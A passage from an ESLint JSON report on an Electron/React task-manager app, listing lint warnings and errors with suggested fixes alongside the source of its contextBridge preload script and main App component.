type.","line":50,"column":45,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":50,"endColumn":48,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1626,1629],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1626,1629],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":58,"column":32,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":58,"endColumn":35,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1824,1827],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1824,1827],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":92,"column":58,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":92,"endColumn":61,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2831,2834],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2831,2834],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":92,"column":74,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":92,"endColumn":77,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2847,2850],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2847,2850],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":100,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":100,"endColumn":18,"suggestions":[{"fix":{"range":[3054,3110],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":106,"column":40,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":106,"endColumn":43,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3218,3221],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3218,3221],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":106,"column":55,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":106,"endColumn":58,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3233,3236],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3233,3236],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":128,"column":45,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":128,"endColumn":48,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4055,4058],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4055,4058],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":135,"column":41,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":135,"endColumn":44,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4337,4340],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4337,4340],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":135,"column":56,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":135,"endColumn":59,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4352,4355],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4352,4355],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":167,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":167,"endColumn":14,"suggestions":[{"fix":{"range":[5349,5428],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":177,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":177,"endColumn":16,"suggestions":[{"fix":{"range":[5754,5836],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":178,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":178,"endColumn":16,"suggestions":[{"fix":{"range":[5839,5878],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":179,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":179,"endColumn":16,"suggestions":[{"fix":{"range":[5881,5935],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":191,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":191,"endColumn":14,"suggestions":[{"fix":{"range":[6199,6300],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":192,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":192,"endColumn":14,"suggestions":[{"fix":{"range":[6303,6381],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]}],"suppressedMessages":[],"errorCount":12,"fatalErrorCount":0,"warningCount":12,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { contextBridge, ipcRenderer } from 'electron';\n\n// ============================================\n// ðŸ” PRELOAD SCRIPT DEBUG LOGGING - 2025 ðŸ”\n// ============================================\nconst PRELOAD_DEBUG = true;\nconst _DEBUG_PREFIX = 'ðŸ”Œ [PRELOAD DEBUG]';\nconst SUCCESS_PREFIX = 'âœ… [PRELOAD SUCCESS]';\nconst _ERROR_PREFIX = 'âŒ [PRELOAD ERROR]';\n\nconst preloadLog = (message: string, data?: any) => {\n  if (!PRELOAD_DEBUG) return;\n  console.log(`${_DEBUG_PREFIX} ${message}`);\n  if (data) {\n    console.log('  ðŸ“Š Data:', data);\n  }\n};\n\nconsole.log('\\n' + '='.repeat(60));\nconsole.log('ðŸ”Œ TASKMASTER PRELOAD SCRIPT INITIALIZING ðŸ”Œ');\nconsole.log('='.repeat(60));\n\npreloadLog('Environment', {\n  contextIsolation: true,\n  nodeIntegration: false,\n  processType: process.type,\n  sandboxed: process.sandboxed,\n  contextId: (process as any).contextId,\n  isMainFrame: (process as any).isMainFrame,\n});\n\n// 2025 Security Best Practices - Secure Preload Script\n// This preload script uses contextBridge to safely expose APIs to the renderer process\n// while maintaining context isolation and preventing privilege escalation attacks\n\n// Define the API interface that will be exposed to the renderer process\ninterface ElectronAPI {\n  // App information\n  getVersion: () => Promise<string>;\n  getPlatform: () => Promise<string>;\n  getAppDataPath: () => Promise<string>;\n  \n  // File system operations (limited and secure)\n  getDocumentsPath: () => Promise<string>;\n  \n  // Dialog operations\n  showError: (title: string, content: string) => Promise<void>;\n  \n  // Auto-updater events\n  onDownloadProgress: (callback: (progress: any) => void) => void;\n  removeDownloadProgressListener: () => void;\n  \n  // Development utilities\n  isDev: boolean;\n}\n\n// Security: Input validation and sanitization\nconst sanitizeString = (input: any): string => {\n  if (typeof input !== 'string') {\n    throw new Error('Input must be a string');\n  }\n  // Basic sanitization - remove potentially dangerous characters\n  return input.replace(/[<>]/g, '').trim();\n};\n\n// Security: Rate limiting for IPC calls\nclass RateLimiter {\n  private calls: Map<string, number[]> = new Map();\n  private readonly maxCalls = 10;\n  private readonly timeWindow = 1000; // 1 second\n\n  public canMakeCall(key: string): boolean {\n    const now = Date.now();\n    const callTimes = this.calls.get(key) || [];\n    \n    // Remove calls outside the time window\n    const recentCalls = callTimes.filter(time => now - time < this.timeWindow);\n    \n    if (recentCalls.length >= this.maxCalls) {\n      return false;\n    }\n    \n    recentCalls.push(now);\n    this.calls.set(key, recentCalls);\n    return true;\n  }\n}\n\nconst _rateLimiter = new RateLimiter();\n\n// Security: Wrapped IPC invoke with rate limiting and error handling\nconst secureIpcInvoke = async (channel: string, ...args: any[]): Promise<any> => {\n  if (!_rateLimiter.canMakeCall(channel)) {\n    throw new Error(`Rate limit exceeded for ${channel}`);\n  }\n  \n  try {\n    return await ipcRenderer.invoke(channel, ...args);\n  } catch (error) {\n    console.error(`IPC call failed for ${channel}:`, error);\n    throw error;\n  }\n};\n\n// Store auto-updater callback for cleanup\nlet downloadProgressCallback: ((event: any, progress: any) => void) | null = null;\n\n// Define the secure API that will be exposed to the renderer\nconst electronAPI: ElectronAPI = {\n  // App information APIs\n  getVersion: () => secureIpcInvoke('app:get-version'),\n  \n  getPlatform: () => secureIpcInvoke('app:get-platform'),\n  \n  getAppDataPath: () => secureIpcInvoke('app:get-app-data-path'),\n  \n  // File system APIs (limited to safe operations)\n  getDocumentsPath: () => secureIpcInvoke('fs:get-documents-path'),\n  \n  // Dialog APIs with input validation\n  showError: async (title: string, content: string) => {\n    const sanitizedTitle = sanitizeString(title);\n    const sanitizedContent = sanitizeString(content);\n    return secureIpcInvoke('dialog:show-error', sanitizedTitle, sanitizedContent);\n  },\n  \n  // Auto-updater APIs\n  onDownloadProgress: (callback: (progress: any) => void) => {\n    // Security: Remove any existing listener first\n    if (downloadProgressCallback) {\n      ipcRenderer.removeListener('download-progress', downloadProgressCallback);\n    }\n    \n    // Create new listener with validation\n    downloadProgressCallback = (_event: any, progress: any) => {\n      // Security: Validate progress object structure\n      if (progress && typeof progress === 'object' && \n          typeof progress.percent === 'number' && \n          typeof progress.transferred === 'number' && \n          typeof progress.total === 'number') {\n        callback(progress);\n      }\n    };\n    \n    ipcRenderer.on('download-progress', downloadProgressCallback);\n  },\n  \n  removeDownloadProgressListener: () => {\n    if (downloadProgressCallback) {\n      ipcRenderer.removeListener('download-progress', downloadProgressCallback);\n      downloadProgressCallback = null;\n    }\n  },\n  \n  // Development flag\n  isDev: process.env.NODE_ENV === 'development'\n};\n\n// Security: Expose the API through contextBridge\n// This is the only way the renderer process can access Electron APIs\n// and it maintains complete context isolation\ntry {\n  preloadLog('Attempting to expose electronAPI via contextBridge...');\n  \n  contextBridge.exposeInMainWorld('electronAPI', electronAPI);\n  \n  console.log(`${SUCCESS_PREFIX} electronAPI successfully exposed to renderer!`);\n  preloadLog('Exposed API methods', Object.keys(electronAPI));\n  \n  // Test that the API was exposed correctly\n  if (typeof window !== 'undefined') {\n    // We're in the preload context, window exists but electronAPI won't be visible here\n    preloadLog('Window object exists in preload context');\n  }\n  \n} catch (error) {\n  console.error(`${_ERROR_PREFIX} Failed to expose electronAPI via contextBridge!`);\n  console.error('Error details:', error);\n  console.error('Stack trace:', (error as Error).stack);\n}\n\n// Security: Additional type safety for TypeScript\ndeclare global {\n  interface Window {\n    electronAPI: ElectronAPI;\n  }\n}\n\n// Security: Log preload script initialization (only in development)\nif (process.env.NODE_ENV === 'development' || PRELOAD_DEBUG) {\n  console.log(`${SUCCESS_PREFIX} TaskMaster preload script initialized with secure contextBridge API`);\n  console.log('ðŸ“‹ Available API methods:', Object.keys(electronAPI).join(', '));\n}\n\n// Security: Prevent any direct access to Node.js or Electron modules\n// The contextBridge is the only authorized communication channel\n// Context isolation ensures the renderer cannot access:\n// - require() function\n// - process object\n// - Buffer global\n// - Any Node.js built-in modules\n// - Direct Electron module access\n\n// Security: Clean up on window unload\nwindow.addEventListener('beforeunload', () => {\n  if (downloadProgressCallback) {\n    ipcRenderer.removeListener('download-progress', downloadProgressCallback);\n  }\n});","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/App.tsx","messages":[{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":53,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":53,"endColumn":22,"suggestions":[{"fix":{"range":[1834,1879],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-hooks/exhaustive-deps","severity":1,"message":"React Hook useEffect has a missing dependency: 'errorHandledStore'. Either include it or remove the dependency array.","line":74,"column":6,"nodeType":"ArrayExpression","endLine":74,"endColumn":38,"suggestions":[{"desc":"Update the dependencies array to be: [errorHandledStore, errorHandledStore.loadFromJSON]","fix":{"range":[2652,2684],"text":"[errorHandledStore, errorHandledStore.loadFromJSON]"}}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":2,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { useEffect, lazy } from 'react'\nimport { motion, AnimatePresence } from 'framer-motion'\nimport { useTaskStore } from '@/store/useTaskStore'\nimport { useErrorHandledTaskStore } from '@/store/storeErrorWrapper'\nimport { Sidebar } from '@/components/layout/Sidebar'\nimport { Header } from '@/components/layout/Header'\nimport { MainContent } from '@/components/layout/MainContent'\nimport { ErrorBoundary } from '@/components/error/ErrorBoundary'\nimport { StoreErrorBoundary } from '@/components/error/StoreErrorBoundary'\nimport { SuspenseWrapper } from '@/components/ui/SuspenseWrapper'\nimport { DebugPanel } from '@/components/DebugPanel'\nimport { cn } from '@/lib/utils'\n\n// Lazy load components for better performance and to demonstrate Suspense\nconst _TaskDetailPanel = lazy(() => \n  import('@/components/task/TaskDetailPanel').then(module => ({ \n    default: module.TaskDetailPanel \n  }))\n)\n\nconst _CommandPalette = lazy(() => \n  import('@/components/ui/CommandPalette').then(module => ({ \n    default: module.CommandPalette \n  }))\n)\n\nconst _ProjectManager = lazy(() => \n  import('@/components/project/ProjectManager').then(module => ({ \n    default: module.ProjectManager \n  }))\n)\n\nfunction App() {\n  // Use regular store for reactive state\n  const { \n    userSettings, \n    sidebarCollapsed, \n    selectedTask\n  } = useTaskStore()\n  \n  // Use error-handled store for operations\n  const errorHandledStore = useErrorHandledTaskStore()\n\n  useEffect(() => {\n    // Load tasks from the sample JSON file (Vite asset handling)\n    const loadTasks = async () => {\n      try {\n        // Vite handles assets in public directory via absolute paths\n        const response = await fetch('/sample-tasks.json')\n        const data = await response.json()\n        await errorHandledStore.loadFromJSON(data)\n      } catch (error) {\n        console.error('Failed to load tasks:', error)\n        // Load minimal sample data as fallback\n        await errorHandledStore.loadFromJSON({ \n          tasks: [\n            {\n              id: 1,\n              title: \"Welcome to TaskMaster!\",\n              description: \"This is a sample task to get you started with the most beautiful task management UI ever created.\",\n              details: \"Explore the interface, try different views, and experience the buttery smooth animations that make this UI a work of art.\",\n              testStrategy: \"Click around and enjoy the pixel-perfect design!\",\n              priority: \"high\" as const,\n              dependencies: [],\n              status: \"pending\" as const,\n              subtasks: []\n            }\n          ]\n        })\n      }\n    }\n    \n    loadTasks()\n  }, [errorHandledStore.loadFromJSON])\n\n  const isDark = userSettings.ui.theme === 'dark' || \n    (userSettings.ui.theme === 'system' && window.matchMedia('(prefers-color-scheme: dark)').matches)\n\n  return (\n    <StoreErrorBoundary \n      enableAutoRecovery={true}\n      maxAutoRecoveryAttempts={3}\n      showDeveloperInfo={process.env.NODE_ENV === 'development'}\n    >\n      <div className={cn(\n        \"min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50\",\n        \"dark:from-slate-950 dark:via-slate-900 dark:to-slate-950\",\n        \"transition-all duration-500 ease-out\",\n        isDark && \"dark\"\n      )}>\n      {/* Debug Panel - Shows critical debug info */}\n      <DebugPanel />\n      \n      {/* Animated background elements */}\n      <div className=\"fixed inset-0 overflow-hidden pointer-events-none\">\n        <motion.div\n          className=\"absolute -top-1/2 -right-1/2 w-96 h-96 bg-gradient-to-br from-blue-400/20 to-purple-600/20 rounded-full blur-3xl\"\n          animate={{\n            x: [0, 100, 0],\n            y: [0, -50, 0],\n            scale: [1, 1.1, 1],\n          }}\n          transition={{\n            duration: 20,\n            repeat: Infinity,\n            repeatType: \"reverse\",\n            ease: \"easeInOut\",\n          }}\n        />\n        <motion.div\n          className=\"absolute -bottom-1/2 -left-1/2 w-96 h-96 bg-gradient-to-tr from-emerald-400/20 to-cyan-600/20 rounded-full blur-3xl\"\n          animate={{\n            x: [0, -100, 0],\n            y: [0, 50, 0],\n            scale: [1, 1.2, 1],\n          }}\n          transition={{\n            duration: 25,\n            repeat: Infinity,\n            repeatType: \"reverse\",\n            ease: \"easeInOut\",\n          }}\n        />\n      </div>\n\n      {/* Main layout */}\n      <div className=\"relative flex h-screen\">\n        {/* Sidebar */}\n        <motion.div\n          initial={false}\n          animate={{\n            width: sidebarCollapsed ? 80 : 280,\n          }}\n          transition={{\n            type: \"spring\",\n            stiffness: 400,\n            damping: 30,\n          }}\n          className=\"flex-shrink-0 border-r border-border/50 bg-background/80 backdrop-blur-xl\"\n        >\n          <Sidebar />\n        </motion.div>\n\n        {/* Main content area */}\n        <div className=\"flex-1 flex flex-col overflow-hidden\">\n          <Header />\n          \n          <div className=\"flex-1 flex overflow-hidden\">\n            {/* Main content */}\n            <motion.div\n              className=\"flex-1 overflow-hidden\"\n              layout\n              transition={{\n                type: \"spring\",\n                stiffness: 400,\n                damping: 30,\n              }}\n            >\n              <MainContent />\n            </motion.div>\n\n            {/* Task detail panel */}\n            <AnimatePresence mode=\"wait\">\n              {selectedTask && (\n                <motion.div\n                  initial={{ x: \"100%\", opacity: 0 }}\n                  animate={{ x: 0, opacity: 1 }}\n                  exit={{ x: \"100%\", opacity: 0 }}\n                  transition={{\n                    type: \"spring\",\n                    stiffness: 400,\n                    damping: 30,\n                  }}\n                  className=\"w-96 border-l border-border/50 bg-background/80 backdrop-blur-xl\"\n                >\n                  <ErrorBoundary level=\"component\">\n                    <SuspenseWrapper level=\"component\" name=\"Task Detail Panel\">\n                      <_TaskDetailPanel />\n                    </SuspenseWrapper>\n                  </ErrorBoundary>\n                </motion.div>\n              )}\n            </AnimatePresence>\n          </div>\n        </div>\n      </div>\n\n      {/* Command Palette */}\n      <ErrorBoundary level=\"component\">\n        <SuspenseWrapper level=\"component\" name=\"Command Palette\">\n          <_CommandPalette />\n        </SuspenseWrapper>\n      </ErrorBoundary>\n\n      {/* Project Manager */}\n      <ErrorBoundary level=\"component\">\n        <SuspenseWrapper level=\"component\" name=\"Project Manager\">\n          <_ProjectManager />\n        </SuspenseWrapper>\n      </ErrorBoundary>\n\n      {/* Global loading overlay */}\n      <AnimatePresence>\n        {useTaskStore.getState().isLoading && (\n          <motion.div\n            initial={{ opacity: 0 }}\n            animate={{ opacity: 1 }}\n            exit={{ opacity: 0 }}\n            className=\"fixed inset-0 bg-background/50 backdrop-blur-sm flex items-center justify-center z-50\"\n          >\n            <motion.div\n              animate={{\n                rotate: 360,\n              }}\n              transition={{\n                duration: 1,\n                repeat: Infinity,\n                ease: \"linear\",\n              }}\n              className=\"w-8 h-8 border-2 border-primary border-t-transparent rounded-full\"\n            />\n          </motion.div>\n        )}\n      </AnimatePresence>\n      </div>\n    </StoreErrorBoundary>\n  )\n}\n\nexport default App","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/__tests__/baseline.test.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/DebugPanel.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/claude/ClaudeConfigPage.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/error/EnhancedErrorBoundary.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":27,"column":57,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":27,"endColumn":60,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1055,1058],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1055,1058],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":27,"column":92,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":27,"endColumn":95,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1090,1093],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1090,1093],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":27,"column":117,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":27,"endColumn":120,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1115,1118],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1115,1118],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":44,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":44,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1670,1673],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1670,1673],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":45,"column":20,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":45,"endColumn":23,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1705,1708],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1705,1708],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":58,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":58,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2029,2032],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2029,2032],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":70,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":70,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2290,2293],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2290,2293],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":81,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":81,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2558,2561],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2558,2561],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":82,"column":19,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":82,"endColumn":22,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2581,2584],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2581,2584],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":174,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":174,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5072,5075],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5072,5075],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":203,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":203,"endColumn":20,"suggestions":[{"fix":{"range":[6055,6224],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":208,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":208,"endColumn":19,"suggestions":[{"fix":{"range":[6253,6314],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":212,"column":64,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":212,"endColumn":67,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6389,6392],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6389,6392],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":213,"column":32,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":213,"endColumn":35,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6427,6430],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6427,6430],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":230,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":230,"endColumn":19,"suggestions":[{"fix":{"range":[6854,6909],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":262,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":262,"endColumn":20,"suggestions":[{"fix":{"range":[7700,8193],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":280,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":280,"endColumn":19,"suggestions":[{"fix":{"range":[8231,8300],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":318,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":318,"endColumn":18,"suggestions":[{"fix":{"range":[9258,9340],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":385,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":385,"endColumn":23,"suggestions":[{"fix":{"range":[11318,11386],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":392,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":392,"endColumn":20,"suggestions":[{"fix":{"range":[11492,11551],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between 